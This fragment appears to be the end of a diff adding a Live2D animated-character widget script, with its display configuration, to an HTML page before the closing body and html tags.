+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
